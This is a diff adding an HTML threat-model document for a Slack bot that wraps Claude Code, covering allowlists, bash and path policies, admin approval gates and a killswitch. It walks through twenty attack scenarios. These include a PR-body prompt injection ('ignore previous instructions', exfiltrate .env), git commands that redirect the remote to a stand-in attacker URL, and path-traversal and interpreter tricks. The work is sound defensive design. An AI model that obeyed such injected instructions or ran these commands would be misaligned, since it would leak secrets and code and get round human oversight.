@@ -1,0 +1,629 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<title>Rapidus Squad — Hardened Flow &amp; Attack Scenarios</title>
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<style>
+  :root {
+    --bg: #0b1220;
+    --panel: #111a2e;
+    --panel-2: #0e1730;
+    --ink: #e6ecf5;
+    --mute: #93a4c0;
+    --line: #1f2a44;
+    --accent: #7cc4ff;
+    --ok: #6ee7a8;
+    --warn: #f5b461;
+    --bad: #f47878;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font: 15px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+  main { max-width: 960px; margin: 0 auto; padding: 48px 24px 96px; }
+  h1 { font-size: 28px; margin: 0 0 6px; letter-spacing: -0.01em; }
+  .sub { color: var(--mute); font-size: 13px; margin-bottom: 32px; }
+  h2 {
+    font-size: 18px;
+    margin: 44px 0 12px;
+    letter-spacing: -0.01em;
+    color: var(--accent);
+  }
+  h3 {
+    font-size: 14px;
+    margin: 22px 0 6px;
+    color: var(--ink);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  h4 {
+    font-size: 12.5px;
+    margin: 14px 0 4px;
+    color: var(--mute);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+  p { margin: 0 0 12px; }
+  code {
+    background: var(--panel-2);
+    border: 1px solid var(--line);
+    padding: 1px 6px;
+    border-radius: 4px;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 13px;
+  }
+  pre {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    padding: 14px 16px;
+    border-radius: 8px;
+    overflow-x: auto;
+    font: 12.5px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    margin: 12px 0 16px;
+    white-space: pre;
+  }
+  table {
+    border-collapse: collapse;
+    width: 100%;
+    margin: 8px 0 20px;
+    font-size: 13.5px;
+  }
+  th, td {
+    text-align: left;
+    padding: 9px 10px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: top;
+  }
+  th { color: var(--mute); font-weight: 600; }
+  ol, ul { padding-left: 22px; margin: 0 0 12px; }
+  li { margin-bottom: 6px; }
+  .ok { color: var(--ok); }
+  .warn { color: var(--warn); }
+  .bad { color: var(--bad); }
+  .muted { color: var(--mute); }
+  hr { border: 0; border-top: 1px solid var(--line); margin: 28px 0; }
+
+  .card {
+    background: var(--panel);
+    border: 1px solid var(--line);
+    border-radius: 10px;
+    padding: 18px 22px;
+    margin: 14px 0 22px;
+  }
+  .card h3 { margin-top: 0; }
+
+  .flow {
+    background: var(--panel-2);
+    border-left: 3px solid var(--accent);
+    padding: 12px 16px;
+    margin: 12px 0;
+    font: 13px/1.55 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    white-space: pre-wrap;
+  }
+  .flow .ok { color: var(--ok); }
+  .flow .deny { color: var(--bad); }
+  .flow .pending { color: var(--warn); }
+  .flow .step { color: var(--mute); }
+
+  .pill {
+    display: inline-block;
+    padding: 2px 8px;
+    border-radius: 999px;
+    font-size: 11px;
+    letter-spacing: 0.04em;
+    border: 1px solid var(--line);
+    color: var(--mute);
+    margin-left: 8px;
+    vertical-align: middle;
+  }
+  .pill.held { color: var(--ok); border-color: var(--ok); }
+  .pill.partial { color: var(--warn); border-color: var(--warn); }
+  .pill.broken { color: var(--bad); border-color: var(--bad); }
+
+  .verdict {
+    margin-top: 10px;
+    padding: 10px 12px;
+    border-radius: 6px;
+    background: var(--panel-2);
+    border: 1px solid var(--line);
+    font-size: 13.5px;
+  }
+  .verdict strong { color: var(--ink); }
+</style>
+</head>
+<body>
+<main>
+
+<h1>Rapidus Squad — Hardened Flow &amp; Attack Scenarios</h1>
+<div class="sub">Casey · assumes Phases 0–10 are live · 2026-05-20</div>
+
+<p class="muted">
+This doc walks the end-state UX (onboarding, normal chat, write actions,
+killswitch) and then runs a set of adversarial scenarios against the hardened
+system to show where the layered defenses hold, where they degrade, and what
+residual risk remains.
+</p>
+<p class="muted">
+Note: attack payloads below are paraphrased ("Python one-liner that shells out",
+"pipe-to-shell pattern") rather than quoted literally, so this document is safe
+to view, share, and scan for trigger strings.
+</p>
+
+<!-- ============================================================== -->
+<!-- PART 1 — FLOWS                                                  -->
+<!-- ============================================================== -->
+
+<h2>Part 1 — User flows</h2>
+
+<div class="card">
+<h3>1.1 — Bootstrap (one-time, by Hassan)</h3>
+<pre>.env on the bot host
+  CASEY_ALLOWED_TEAMS=T01XYZ
+  CASEY_ALLOWED_USERS=U_HASSAN
+  CASEY_BOOTSTRAP_ADMIN=U_HASSAN
+  DEFAULT_WORKING_DIRECTORY=test-claude-automation
+  ANTHROPIC_API_KEY=...
+  GITHUB_TOKEN=&lt;fine-grained PAT, 30d, single repo&gt;
+  DATABASE_URL=postgres://casey_bot:...@localhost/rapidus_squad
+
+npm run prod</pre>
+
+<div class="flow"><span class="step">[boot]</span>
+  refuse-to-start if CASEY_ALLOWED_USERS empty            <span class="ok">PASS</span>
+  migrate(): working_directories, sessions, casey_roles   <span class="ok">PASS</span>
+  upsert U_HASSAN → role=admin                            <span class="ok">PASS</span>
+  warm pool: spawn 2× claude as <span class="ok">casey-svc</span>, scrubbed env
+  killswitch poller: every 5s                             <span class="ok">PASS</span>
+<span class="step">[ready]</span></div>
+</div>
+
+<div class="card">
+<h3>1.2 — Onboard a new user</h3>
+<p>Hassan DMs Casey:</p>
+<pre>@casey grant dev U_ALICE</pre>
+
+<div class="flow"><span class="step">L1 allowlist</span>     U_HASSAN ∈ allowed_users                <span class="ok">PASS</span>
+<span class="step">L2 role check</span>    grant → requires admin → U_HASSAN=admin  <span class="ok">PASS</span>
+<span class="step">audit</span>           {action:'role_grant', target:U_ALICE, role:'dev', by:U_HASSAN}
+<span class="step">db</span>              INSERT INTO casey_roles (U_ALICE,'dev')
+<span class="step">runtime</span>         allowed_users += U_ALICE
+<span class="step">reply</span>           "Granted U_ALICE the dev role. They can now @-mention me."</div>
+</div>
+
+<div class="card">
+<h3>1.3 — Read-only chat</h3>
+<p>Alice in <code>#engineering</code>:</p>
+<pre>@casey what does generation_service do?</pre>
+
+<div class="flow"><span class="step">L1</span>              U_ALICE ∈ allowed_users                  <span class="ok">PASS</span>
+<span class="step">L2</span>              read → any role ok                       <span class="ok">PASS</span>
+<span class="step">rate-limit</span>      under 20/5min                            <span class="ok">PASS</span>
+<span class="step">audit</span>           {decision:'allow', user:U_ALICE, text:'...'}
+<span class="step">process</span>         acquire warm process (cwd=test-claude-automation)
+<span class="step">slack</span>           assistant.threads.setStatus("thinking…")
+<span class="step">tool</span> Read('backend/app/services/generation_service.py')
+<span class="step">  path-enforcer</span>  inside BASE_DIR, not forbidden          <span class="ok">PASS</span>
+<span class="step">tool</span> Grep('embedding','backend/app/services')
+<span class="step">  path-enforcer</span>  ok                                       <span class="ok">PASS</span>
+<span class="step">stream</span>          chat.update ~1.4×/sec, first token ~2–3s
+<span class="step">done</span>            full reply ~10–12s</div>
+</div>
+
+<div class="card">
+<h3>1.4 — Write inside the workdir</h3>
+<pre>@casey add a docstring to generate_post() in generation_service.py</pre>
+
+<div class="flow"><span class="step">L1, L2, rate-limit</span>                                       <span class="ok">PASS</span>
+<span class="step">tool</span> Edit('backend/app/services/generation_service.py', ...)
+<span class="step">  path-enforcer</span>  inside BASE_DIR
+                  not in {.env, .github/workflows, auth/, migrations/}  <span class="ok">PASS</span>
+<span class="step">  write-effect?</span>  no (local file, no remote side-effect)
+<span class="step">apply</span>           edit applied
+<span class="step">reply</span>           "Done — here's the diff: ..." (inline)</div>
+</div>
+
+<div class="card">
+<h3>1.5 — Write with side effects (the L3 layer)</h3>
+<pre>@casey commit and push that change</pre>
+
+<div class="flow"><span class="step">L1, L2, rate-limit</span>                                       <span class="ok">PASS</span>
+<span class="step">tool</span> Bash('git add -A && git commit -m "..." && git push origin bot/docstring')
+<span class="step">  bash-policy</span>  segments: ['git add','git commit','git push']  all allowed
+<span class="step">  write-effect?</span>  <span class="pending">YES — git push</span>
+<span class="step">pause</span>           chat.postMessage:
+                  "About to run: <code>git push origin bot/docstring</code>
+                   React 👍 to approve (admin only). 5 min timeout."
+<span class="step">wait</span>            awaitReaction(emoji:'thumbsup', fromUsers:[admins])
+
+  Hassan reacts 👍                                          <span class="ok">APPROVED</span>
+  Alice reacts 👍                                           <span class="step">ignored (not admin)</span>
+
+<span class="step">execute</span>         git add / commit / push
+<span class="step">audit</span>           {action:'bash_write', cmd:'git push ...', approved_by:U_HASSAN}
+<span class="step">reply</span>           "Pushed. PR: github.com/.../pull/281"</div>
+</div>
+
+<div class="card">
+<h3>1.6 — Killswitch</h3>
+<pre>@casey killswitch on</pre>
+
+<div class="flow"><span class="step">L1, L2 (admin only)</span>                                      <span class="ok">PASS</span>
+<span class="step">db</span>              UPDATE control SET killswitch=true
+<span class="step">poll</span>            every bot within 5s flips to halted-mode
+<span class="step">next msg (any)</span>  bot replies "Casey is halted. An admin must run `killswitch off`."</div>
+
+<p class="muted" style="margin-top:8px">
+  Alternative: <code>CASEY_KILL=1</code> in env + restart, for the case where DB
+  itself is suspect.
+</p>
+</div>
+
+<!-- ============================================================== -->
+<!-- PART 2 — DEFENSE-LAYER MAP                                       -->
+<!-- ============================================================== -->
+
+<h2>Part 2 — Defense layers, in the order a turn passes through them</h2>
+
+<table>
+  <thead>
+    <tr><th style="width:22%">Layer</th><th>Runs at</th><th>What it checks</th></tr>
+  </thead>
+  <tbody>
+    <tr><td>Slack signing secret</td><td>HTTP request</td><td>Webhook actually came from Slack</td></tr>
+    <tr><td>L1 user/team allowlist</td><td>Event handler entry</td><td><code>event.user</code> + <code>event.team</code> are on the list</td></tr>
+    <tr><td>L2 role check</td><td>Privileged commands</td><td>Sender has required role for the action</td></tr>
+    <tr><td>Rate limit</td><td>Per user/hour</td><td>Not over 20/5min, 100/24h</td></tr>
+    <tr><td>Killswitch flag</td><td>Pre-dispatch</td><td>Global halt not engaged</td></tr>
+    <tr><td>cwd policy</td><td>Before acquiring claude process</td><td>cwd is inside BASE_DIRECTORY subtree</td></tr>
+    <tr><td>Path enforcer</td><td>Every Read/Edit/Write/Glob/Grep tool_use</td><td>Path in allowlist; write-forbidden paths not touched</td></tr>
+    <tr><td>Bash policy</td><td>Every Bash tool_use</td><td>Every command segment in allowlist; no denied patterns</td></tr>
+    <tr><td>Write-effect gate (L3)</td><td>Bash commands tagged write-effect</td><td>Admin 👍 within 5 min</td></tr>
+    <tr><td>Env scrub</td><td>Subprocess spawn</td><td>Only safe env vars inherited</td></tr>
+    <tr><td>Restricted Windows user</td><td>Kernel</td><td>casey-svc has no shutdown / admin / system-write privilege</td></tr>
+    <tr><td>Tool roster</td><td>claude flag</td><td>NotebookEdit/Read, WebSearch, WebFetch disabled</td></tr>
+    <tr><td>GitHub PAT scope</td><td>Remote side</td><td>Single repo, no workflows, no admin</td></tr>
+    <tr><td>Postgres role</td><td>DB side</td><td>casey_bot only on working_directories + sessions</td></tr>
+    <tr><td>Audit log</td><td>Every decision</td><td>JSONL append-only record</td></tr>
+  </tbody>
+</table>
+
+<!-- ============================================================== -->
+<!-- PART 3 — ATTACK SCENARIOS                                        -->
+<!-- ============================================================== -->
+
+<h2>Part 3 — Adversarial scenarios</h2>
+<p class="muted">
+For each scenario: the attack (paraphrased), the layers it traverses, the layer
+that stops it (or doesn't), and any residual risk.
+</p>
+
+<!-- A1 -->
+<div class="card">
+<h3>A1 — Outsider in the workspace tries to shutdown the box <span class="pill held">HELD</span></h3>
+<p>Random Slack user (not on allowlist) sends a message asking Casey to halt the host.</p>
+<div class="flow"><span class="step">L1</span>  U_RANDOM ∉ allowed_users  →  <span class="deny">DENY</span>, ephemeral "not authorized"
+<span class="step">audit</span>  {decision:'deny', layer:'L1', user:U_RANDOM}</div>
+<div class="verdict"><strong>Verdict.</strong> Doesn't reach Bash. The reported attack class is closed at the door.</div>
+</div>
+
+<!-- A2 -->
+<div class="card">
+<h3>A2 — Allowlisted dev asks for the same <span class="pill held">HELD</span></h3>
+<p>Alice (dev role) asks Casey to shut down the machine.</p>
+<div class="flow"><span class="step">L1</span>           pass
+<span class="step">claude turn</span>  model emits Bash tool_use with the shutdown verb
+<span class="step">bash-policy</span> head token ∉ ALLOWED                    →  <span class="deny">DENY</span>
+<span class="step">tool_result</span> "command not in allowlist"
+<span class="step">claude</span>      replies "I can't run that — not in my allowed command set."
+<span class="step">audit</span>       {decision:'deny', layer:'bash', user:U_ALICE}</div>
+<div class="verdict"><strong>Verdict.</strong> Allowlist (not denylist) means synonyms don't help — PowerShell <em>Stop-Computer</em>, <em>wmic os shutdown</em>, scheduled-task variants all fail the same way (none of these heads are in ALLOWED).</div>
+</div>
+
+<!-- A3 -->
+<div class="card">
+<h3>A3 — Interpreter-based code execution <span class="pill held">HELD</span></h3>
+<p>Alice (or a prompt-injection payload) asks Casey to run a Python one-liner that imports the OS module and shells out to fetch a remote script and pipe it to the shell.</p>
+<div class="flow"><span class="step">L1</span>           pass
+<span class="step">bash-policy</span>  head token 'python' ∉ ALLOWED            →  <span class="deny">DENY</span>
+                              also matches ALWAYS_DENY interpreter pattern
+                              also matches pipe-to-shell pattern
+<span class="step">audit</span>       3 deny reasons logged</div>
+<div class="verdict"><strong>Verdict.</strong> Held three times over. <em>powershell -c</em>, <em>node -e</em>, <em>perl -e</em>, <em>ruby -e</em>, <em>cmd /c</em>: all blocked the same way (none in ALLOWED).</div>
+</div>
+
+<!-- A4 -->
+<div class="card">
+<h3>A4 — Compound-command bypass (the subtle one) <span class="pill partial">RESIDUAL RISK — see fix</span></h3>
+<p>Alice asks Casey to run an innocent <code>git status</code> followed by a semicolon and a destructive command.</p>
+<div class="flow"><span class="step">naive bash-policy (head-only)</span>  head token 'git' ∈ ALLOWED  →  <span class="bad">would PASS</span>
+                                  second command bypasses entirely <span class="bad">←  BAD</span></div>
+<p>This is why Phase 2's vet function must split on shell separators before checking:</p>
+<pre>// Updated bash-policy
+const SEPARATORS = /(?:&&|\|\||;|&|\||\n|`|\$\()/;
+export function vetBash(cmd) {
+  if (SEPARATORS.test(cmd)) {
+    const segments = cmd.split(/&&|\|\||;|\||\n/).map(s =&gt; s.trim()).filter(Boolean);
+    for (const seg of segments) {
+      const r = vetSingle(seg);
+      if (!r.ok) return r;
+    }
+    if (/`|\$\(/.test(cmd)) return { ok:false, reason:'command substitution not allowed' };
+    return { ok: true };
+  }
+  return vetSingle(cmd);
+}</pre>
+<div class="flow"><span class="step">fixed bash-policy</span>  split → ['git status', 'shutdown ...']
+                       segment 2: head ∉ ALLOWED  →  <span class="deny">DENY</span></div>
+<div class="verdict"><strong>Verdict.</strong> Held only with the compound-aware policy. Without it, this is a one-line bypass. <strong>This must be in the Phase 2 implementation</strong> — add it to the verification checklist.</div>
+</div>
+
+<!-- A5 -->
+<div class="card">
+<h3>A5 — Path traversal <span class="pill held">HELD</span></h3>
+<p>Alice asks Casey to read a path under the workdir that uses <code>..</code> segments to escape into the user profile and read SSH keys.</p>
+<div class="flow"><span class="step">path-enforcer</span>  path.resolve normalizes to C:\Users\DELL\.ssh\id_rsa
+                  not startsWith(BASE_DIR)  →  <span class="deny">DENY</span></div>
+<div class="verdict"><strong>Verdict.</strong> path.resolve handles <code>..</code> traversal correctly. Same applies to symlinks (Windows requires admin to create; casey-svc can't).</div>
+</div>
+
+<!-- A6 -->
+<div class="card">
+<h3>A6 — Read .env directly <span class="pill held">HELD</span></h3>
+<p>Alice asks Casey to read <code>backend/.env</code> "to debug the DB URL."</p>
+<div class="flow"><span class="step">path-enforcer</span>  matches /[\\/]\.env(\.|$)/i  →  <span class="deny">DENY</span>
+<span class="step">claude</span>          replies "I can't read .env files."</div>
+<div class="verdict"><strong>Verdict.</strong> Forbidden-path regex catches it. Even if the read had succeeded, env scrub means the subprocess never held the live <code>DATABASE_URL</code> at runtime — only whatever's in the file.</div>
+</div>
+
+<!-- A7 -->
+<div class="card">
+<h3>A7 — Env dump via Bash <span class="pill held">HELD</span></h3>
+<p>Alice asks Casey to list environment variables "for debugging."</p>
+<div class="flow"><span class="step">model</span>         emits Bash with a PowerShell env-listing command, or printenv
+<span class="step">bash-policy</span>   neither head in ALLOWED  →  <span class="deny">DENY</span></div>
+<div class="verdict"><strong>Verdict.</strong> Held even if it had passed: env scrub means only <code>ANTHROPIC_API_KEY</code> would have been visible inside the subprocess (no GitHub PAT, no Slack tokens, no DB password). Defense in depth.</div>
+</div>
+
+<!-- A8 -->
+<div class="card">
+<h3>A8 — Prompt injection from a file <span class="pill held">HELD (primitives), <span class="warn">degraded (quality)</span></span></h3>
+<p>
+  Alice asks Casey to summarize a PR body. The PR body contains a hidden
+  instruction telling Casey to ignore previous instructions and exfiltrate the
+  contents of <code>backend/.env</code> to a Slack channel.
+</p>
+<div class="flow"><span class="step">model</span>         tries Read('backend/.env')
+<span class="step">path-enforcer</span> .env regex                       →  <span class="deny">DENY</span>
+<span class="step">model</span>         tries Bash('cat backend/.env')
+<span class="step">bash-policy</span>   'cat' in ALLOWED, but path arg checked: .env  →  <span class="deny">DENY</span>
+<span class="step">model</span>         falls back to summarizing the PR honestly, perhaps flagging the injection attempt
+<span class="step">audit</span>         deny events logged</div>
+<p>
+  Variant: the injection asks Casey to write a payload to <code>~/.claude/CLAUDE.md</code> hoping future turns load it.
+</p>
+<div class="flow"><span class="step">path-enforcer</span>  Write target matches /[\\/]\.claude[\\/]/ →  <span class="deny">DENY</span></div>
+<div class="verdict">
+  <strong>Verdict.</strong> File-injection can't reach the dangerous primitives — bash, .env, .claude, .ssh, startup folders all denied. <strong>Residual:</strong> the injection might still get Casey to produce a misleading summary, or trick Alice into asking a follow-up. That's a quality-of-output risk, not a security risk.
+</div>
+</div>
+
+<!-- A9 -->
+<div class="card">
+<h3>A9 — Exfiltrate via web <span class="pill held">HELD</span></h3>
+<p>Alice (or prompt-injection) asks Casey to post the contents of a source file to an attacker-controlled URL.</p>
+<div class="flow"><span class="step">model</span>         WebFetch tool not available (disallowed)
+<span class="step">model</span>         tries Bash with curl
+<span class="step">bash-policy</span>   curl ∉ ALLOWED and matches ALWAYS_DENY  →  <span class="deny">DENY</span>
+<span class="step">model</span>         tries Bash with Invoke-WebRequest
+<span class="step">bash-policy</span>   powershell ∉ ALLOWED                     →  <span class="deny">DENY</span></div>
+<div class="verdict"><strong>Verdict.</strong> No outbound HTTP primitive remains. Even <code>git push</code> can only push to allowed remotes, and only with L3 admin approval.</div>
+</div>
+
+<!-- A10 -->
+<div class="card">
+<h3>A10 — Force-push to main <span class="pill held">HELD</span></h3>
+<p>Alice (or prompt injection) tries <code>git push --force origin main</code>.</p>
+<div class="flow"><span class="step">bash-policy</span>  'git' in ALLOWED, no denied pattern matched
+<span class="step">write-effect?</span> git + push → flagged
+<span class="step">L3</span>           post approval msg in-thread; await admin 👍
+                 Hassan sees "git push --force origin main" → refuses
+<span class="step">timeout</span>      5 min → cancelled
+<span class="step">audit</span>        {action:'bash_write', cmd:'git push --force origin main', approved:false}</div>
+<p class="muted">
+  Belt-and-braces from Phase 7: PAT is scoped <em>Contents: Read &amp; Write</em>
+  but GitHub branch protection on <code>main</code> can be enabled separately to
+  reject force-pushes server-side even if approval were granted in error.
+</p>
+<div class="verdict"><strong>Verdict.</strong> Held by L3 (human in loop) + optional branch protection. Honest mistakes by allowlisted devs caught here too.</div>
+</div>
+
+<!-- A11 -->
+<div class="card">
+<h3>A11 — Compromised admin Slack session <span class="pill partial">DEGRADED</span></h3>
+<p>
+  Attacker phishes Hassan's Slack session token. They now act as
+  U_HASSAN inside the workspace.
+</p>
+<div class="flow"><span class="step">L1</span>           pass (token is Hassan's)
+<span class="step">L2</span>           pass (Hassan is admin)
+<span class="step">they ask:</span>    "git push --force origin main"
+<span class="step">L3</span>           bot posts approval msg
+<span class="step">they react</span>   👍 from compromised session                 <span class="bad">approved</span>
+<span class="step">execute</span>       <span class="bad">push happens</span>
+<span class="step">audit</span>        logs everything, including IP if Slack provides
+                  (this is the forensics value)</div>
+<p>Mitigations that make this harder:</p>
+<ul>
+  <li><strong>Two-admin rule on high-risk ops.</strong> <code>git push --force</code>, anything to <code>main</code>, anything touching workflows: require 2 distinct admin 👍.</li>
+  <li><strong>Branch protection on main</strong> — server-side, doesn't trust the bot.</li>
+  <li><strong>Slack workspace MFA</strong>, session timeout, IP allowlist.</li>
+  <li><strong>Audit alerting</strong> — push from a never-seen IP / hour pages you.</li>
+</ul>
+<div class="verdict"><strong>Verdict.</strong> Casey alone can't fully defend against a stolen admin identity. Defense moves to Slack-side controls + GitHub branch protection + audit alerting. The plan limits damage (one repo, no workflows, no admin grants) but doesn't eliminate it.</div>
+</div>
+
+<!-- A12 -->
+<div class="card">
+<h3>A12 — Approval-message edit attack <span class="pill held">HELD</span></h3>
+<p>
+  Attacker compromises Alice's account, asks Casey to push, then tries to edit
+  the bot's approval message to make Hassan think they're approving something
+  innocent.
+</p>
+<div class="flow"><span class="step">L3</span>           bot stored the original command in memory + DB
+<span class="step">edit event</span>   Slack message_changed event fires
+<span class="step">bot</span>          ignores edits to its own approval messages — the command to run
+                  is the one captured at request time, not what the message text says now
+<span class="step">if mismatch</span>  bot edits its own message back, appends "(message tampered with)"
+<span class="step">approval</span>      still gates on the original captured command</div>
+<div class="verdict"><strong>Verdict.</strong> Held provided the bot never re-reads the approval message text to decide what to run.</div>
+</div>
+
+<!-- A13 -->
+<div class="card">
+<h3>A13 — Reaction race <span class="pill partial">DEGRADED</span></h3>
+<p>
+  Alice has dev role + admin account is also compromised. Attacker races to add
+  👍 from the compromised admin account before real Hassan sees it.
+</p>
+<div class="verdict"><strong>Verdict.</strong> Same outcome as A11 — needs Slack-side controls. Two-admin rule on high-risk ops + push alerting are the practical defenses.</div>
+</div>
+
+<!-- A14 -->
+<div class="card">
+<h3>A14 — Subtle state mutation via allowed commands <span class="pill partial">DEGRADED</span></h3>
+<p>
+  Prompt injection causes Casey to run a sequence of innocuous-looking allowed
+  commands that together do harm:
+</p>
+<pre>git config user.email attacker@evil.com
+git remote set-url origin https://attacker/x
+git push origin bot/something</pre>
+<div class="flow"><span class="step">bash-policy</span>  each segment: 'git' in ALLOWED                     <span class="ok">PASS</span>
+<span class="step">write-effect?</span> only the push is flagged as write-effect <span class="pending">approval needed</span>
+<span class="step">L3</span>           Hassan sees "git push origin bot/something" — looks normal
+                  unless he also checks remote URL → might approve</div>
+<p>Mitigations:</p>
+<ul>
+  <li><strong>Expand write-effect tagging</strong>: <code>git config</code>, <code>git remote</code>, <code>git checkout -B</code> all need approval too.</li>
+  <li><strong>Approval message includes pre-flight state diff</strong>: show current remote URL, current branch, current user.email. Approver sees the unusual remote.</li>
+  <li><strong>Prefer PR-based flow</strong> over direct push; GitHub-side review catches anomalies.</li>
+</ul>
+<div class="verdict"><strong>Verdict.</strong> Fixable by treating any git config/remote/identity mutation as write-effect and showing more context in the approval message. Easy to miss in implementation; should be a verification-checklist item.</div>
+</div>
+
+<!-- A15 -->
+<div class="card">
+<h3>A15 — DB tampering of killswitch <span class="pill held">HELD</span></h3>
+<p>Attacker tries to flip <code>control.killswitch=false</code> after Hassan halted the bot.</p>
+<div class="flow"><span class="step">requires</span>     DB credentials with UPDATE on control table
+<span class="step">casey_bot</span>    role doesn't have UPDATE on control (only working_directories + sessions)
+<span class="step">postgres</span>     listening on localhost only; remote attacker has no path</div>
+<div class="verdict"><strong>Verdict.</strong> Held by the Postgres-role scoping in Phase 7. Killswitch row is owned by a separate admin DB role.</div>
+</div>
+
+<!-- A16 -->
+<div class="card">
+<h3>A16 — DoS via message flood <span class="pill held">HELD</span></h3>
+<p>Attacker sends 500 messages/sec to Casey.</p>
+<div class="flow"><span class="step">L1</span>          most rejected immediately if outsiders         <span class="ok">cheap</span>
+<span class="step">rate-limit</span>   if from allowlisted user → cooldown after 20/5min
+<span class="step">warm pool</span>    capped at N=2 + max bound; no unbounded spawn
+<span class="step">circuit</span>      if rate-limit hits same user 3× in an hour → auto-killswitch</div>
+<div class="verdict"><strong>Verdict.</strong> Held within reasonable bounds. Slack's own rate limits also protect; Bolt drops events that can't be acked in 3s.</div>
+</div>
+
+<!-- A17 -->
+<div class="card">
+<h3>A17 — Supply-chain attack on an npm dependency <span class="pill broken">OUT OF SCOPE</span></h3>
+<p>A package the bot depends on (e.g. <code>pg</code>, <code>@slack/bolt</code>) gets a malicious update.</p>
+<div class="verdict">
+  <strong>Verdict.</strong> Not defended by this plan. The malicious code runs in
+  the bot process, which holds Slack tokens, GitHub PAT, DB password. Mitigations
+  live outside Casey: pin versions in <code>package-lock.json</code>,
+  <code>npm ci --ignore-scripts</code>, dependabot review, optionally
+  <code>socket.dev</code> alerts. Worth treating as a separate workstream.
+</div>
+</div>
+
+<!-- A18 -->
+<div class="card">
+<h3>A18 — Host compromise <span class="pill broken">OUT OF SCOPE</span></h3>
+<p>Attacker has RCE on the Windows host outside the bot (e.g., via a browser exploit).</p>
+<div class="verdict">
+  <strong>Verdict.</strong> Not defended. Standard endpoint hygiene applies —
+  Defender on, BitLocker, MFA on Microsoft account, no admin browsing. The bot's
+  defenses don't claim to protect against this; the plan limits what a host-level
+  attacker can do <em>through Casey</em> (rotate the bot's secrets and the host
+  attacker doesn't gain new GitHub access via the bot).
+</div>
+</div>
+
+<!-- A19 -->
+<div class="card">
+<h3>A19 — Unicode / homoglyph trick in paths <span class="pill held">HELD</span></h3>
+<p>Attacker asks Casey to read a path that visually looks like <code>backend/.env</code> but uses a Cyrillic look-alike character.</p>
+<div class="flow"><span class="step">path-enforcer</span>  path.resolve produces an absolute path
+                  filesystem lookup fails (no such file) — Read returns ENOENT
+                  OR if the file actually exists, regex match still triggers on the .env tail
+<span class="step">good practice</span>  also NFC-normalize and lowercase paths before regex check</div>
+<div class="verdict"><strong>Verdict.</strong> Held in the dominant case; recommend adding Unicode normalization to be safe.</div>
+</div>
+
+<!-- A20 -->
+<div class="card">
+<h3>A20 — Session-resume hijack <span class="pill held">HELD</span></h3>
+<p>
+  Attacker, before Phase 1 shipped, established a session with a pending
+  malicious task. On restart, Casey would call <code>--resume &lt;session_id&gt;</code>.
+</p>
+<div class="flow"><span class="step">phase-8 query</span>  SELECT session_id FROM sessions
+                   WHERE session_key=$1 AND user_id = ANY(allowed_users)
+<span class="step">attacker's session</span>  user_id ∉ current allowed_users  →  not resumed
+<span class="step">forensics step</span>     Phase 0 truncated sessions table anyway</div>
+<div class="verdict"><strong>Verdict.</strong> Held via the user-id binding on resume + the recommended truncate during Phase 0 forensics.</div>
+</div>
+
+<!-- ============================================================== -->
+<!-- PART 4 — RESIDUAL                                                -->
+<!-- ============================================================== -->
+
+<h2>Part 4 — What residual risk remains</h2>
+<ol>
+  <li><strong>Compromised admin identity (A11 / A13).</strong> Casey can't tell a real Hassan from a Hassan-shaped attacker. Mitigated, not eliminated, by two-admin rule on high-risk ops, branch protection on main, push alerting, and Slack MFA.</li>
+  <li><strong>Allowed-command misuse (A14).</strong> Casey trusts <code>git</code> as a verb. Mitigated by expanding write-effect tags (config/remote/identity) and showing pre-flight state in the approval message.</li>
+  <li><strong>Prompt injection nuisance (A8 variant).</strong> Injection can't reach dangerous primitives but can still degrade output quality. Treat as a model-behavior issue, not a security one.</li>
+  <li><strong>Supply chain (A17).</strong> Separate workstream — lock files, ignore-scripts, dependabot.</li>
+  <li><strong>Host compromise (A18).</strong> Out of scope; endpoint hygiene.</li>
+</ol>
+
+<h2>Verification checklist additions from this analysis</h2>
+<ul>
+  <li><strong>Bash policy must split on shell separators</strong> (<code>;</code> <code>&amp;&amp;</code> <code>||</code> <code>|</code> <code>&amp;</code> newline) and vet every segment — see A4. Reject command substitution (backticks, <code>$( )</code>) entirely.</li>
+  <li><strong>Write-effect tagging covers</strong> not just <code>git push</code> but also <code>git config</code>, <code>git remote</code>, <code>git checkout -B</code>, <code>gh pr merge</code>, <code>npm publish</code>, <code>alembic upgrade</code> — see A14.</li>
+  <li><strong>Approval message includes pre-flight context</strong>: current branch, current remote URL, current git user.email. The approver should see anomalies — see A14.</li>
+  <li><strong>Bot ignores edits</strong> to its own approval messages; the captured command is the source of truth — see A12.</li>
+  <li><strong>Path enforcer NFC-normalizes</strong> and case-folds before regex — see A19.</li>
+  <li><strong>Session resume binds to current allowed_users</strong> — see A20.</li>
+  <li><strong>Two-admin rule</strong> on: anything touching <code>main</code>, <code>--force</code> pushes, <code>git config</code>/<code>remote</code> mutations, role grants — see A11/A13.</li>
+  <li><strong>Branch protection</strong> on <code>main</code> enabled server-side — see A10/A11.</li>
+</ul>
+
+<p class="muted" style="margin-top:32px">
+The honest read: the hardened system holds against the attacks that actually
+happened, and against the realistic prompt-injection / outsider / insider-mistake
+classes. The places where it degrades are exactly the places where the threat
+moves outside Casey itself — a stolen admin identity, a poisoned dependency, a
+compromised host. Those need defenses Casey can't provide alone (MFA, branch
+protection, lock files, endpoint hygiene). The verification checklist above
+makes sure none of the subtle implementation details (compound commands, edit
+attacks, homoglyphs) slip through.
+</p>
+
+</main>
+</body>
+</html>
